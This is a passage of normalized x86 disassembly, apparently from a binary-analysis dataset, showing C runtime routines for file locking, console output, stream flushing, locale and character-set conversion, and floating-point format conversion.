and esi 0x1f
imul esi esi 0x28
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_4141fc
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_410721
retn
mov eax edi
sar eax 0x5
and edi 0x1f
imul edi edi 0x28
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41d2cb
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_41ab5c
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_41d2f6
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
or ax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_41f8a0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40f589
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_41d3b8
push 0x10
push r--data
call sub_4106dc
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_4141fc
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41d44e
mov eax [ ebp - 0x1c ]
call sub_410721
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_41f95f
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_40f613
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_41d457
push ebx
push esi
mov esi [ esp + 0xc ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_41b6c0
pop ecx
push eax
call sub_41b3c7
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_41d4b9
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_41d457
test eax eax
pop ecx
je r-xdata
push esi
call sub_41d4fb
pop ecx
pop esi
retn
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push esi
call sub_41b6c0
push eax
call sub_41f9db
pop ecx
pop ecx
neg eax
sbb eax eax
pop esi
retn
sub_41d4fb
push 0x14
push r--data
call sub_4106dc
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_4141fc
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41d5cc
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_410721
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_41b64b
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_41d59d
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_41d4b9
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_41d4b9
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_41d5de
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_4110bb
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_41fe45
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41fe85
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41d6e1
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_4174d9
cmp eax esi
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_40f613
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_420027
test eax eax
pop ecx
pop ecx
jge r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
cmp eax esi
mov [ ebp - 0x8 ] eax
je r-xdata
push [ ebp - 0x4 ]
call sub_40f613
pop ecx
mov [ ebp - 0x4 ] esi
sub_41d776
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_40f8d1
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f589
leave
retn
sub_41d7bd
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
cmp eax [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
test eax eax
mov ebx [ MultiByteToWideChar@IAT ]
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f589
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_4109d0
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
cmp esi 0xffffffff
mov [ ebp - 0x2c ] 0x1
jne r-xdata
push [ ebp - 0x1c ]
call sub_41c221
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_40f80e
cmp eax edi
pop ecx
je r-xdata
call sub_411010
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_4108e0
mov esi eax
pop ecx
inc esi
cmp [ ebp - 0x2c ] edi
mov ebx [ WideCharToMultiByte@IAT ]
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_4174d9
cmp eax edi
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_40f613
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_41d96f
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_4110bb
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41cb38
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41cb38
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_420270
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_41da5f
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
cmp ebx 0xffffc001
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
cmp esi edx
mov [ ebp + 0x8 ] esi
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_41dfa1
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
cmp ebx 0xffffc001
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
